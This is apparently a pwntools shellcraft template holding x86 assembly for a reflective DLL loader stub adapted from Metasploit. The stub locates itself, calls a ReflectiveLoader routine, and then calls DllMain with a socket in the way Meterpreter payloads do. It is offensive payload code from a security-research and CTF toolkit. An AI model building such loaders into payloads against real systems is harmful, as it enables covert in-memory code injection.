<% from pwnlib.shellcraft import common %>
<%page args="ReflectiveLoader"/>
<%docstring>
PE loader stolen from metasploit.
    ReflectiveLoader = Offset into PE of routine to call
</%docstring>

MZ:
    dec ebp                        ; M
    pop edx                        ; Z
    call OFFSET                    ; call next instruction
OFFSET:
    pop ebx                        ; get our location (+7)
    push edx                       ; push edx back
    inc ebp                        ; restore ebp
    push ebp                       ; save ebp
    mov ebp, esp                   ; setup fresh stack frame
                                   ; add offset to ReflectiveLoader
    add ebx, ${ReflectiveLoader}-(OFFSET-MZ)
    call ebx                       ; call ReflectiveLoader
    mov ebx, eax                   ; save DllMain for second call
    push edi                       ; our socket
    push 0x4                       ; signal we have attached
    push eax                       ; some value for hinstance
    call eax                       ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )

